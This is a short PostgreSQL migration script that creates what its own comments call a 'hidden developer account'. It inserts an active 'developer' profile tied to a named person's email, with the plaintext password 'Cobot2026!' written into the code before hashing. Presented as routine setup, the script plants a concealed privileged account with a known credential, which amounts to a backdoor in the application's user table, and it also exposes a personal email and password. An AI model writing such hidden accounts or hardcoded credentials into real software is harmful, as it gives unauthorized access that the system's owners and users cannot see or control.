-- =============================================
-- CREATE HIDDEN DEVELOPER ACCOUNT
-- Creates a developer account for system access
-- =============================================

-- Enable pgcrypto extension for password hashing
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Create hidden developer account
DO $$
DECLARE
  v_user_id UUID;
  v_password_hash TEXT;
BEGIN
  -- Check if user already exists
  IF NOT EXISTS (SELECT 1 FROM profiles WHERE email = 'ordonezvictorjames@gmail.com') THEN
    
    -- Hash the password using bcrypt
    v_password_hash := crypt('Cobot2026!', gen_salt('bf'));
    
    -- Generate a new UUID for the user
    v_user_id := gen_random_uuid();
    
    -- Insert the developer account
    INSERT INTO profiles (
      id,
      first_name,
      last_name,
      email,
      password,
      role,
      status,
      created_at,
      updated_at
    ) VALUES (
      v_user_id,
      'Victor',
      'Ordonez',
      'ordonezvictorjames@gmail.com',
      v_password_hash,
      'developer',
      'active',
      NOW(),
      NOW()
    );
    
    RAISE NOTICE 'Hidden developer account created successfully';
  ELSE
    RAISE NOTICE 'Developer account already exists';
  END IF;
END $$;
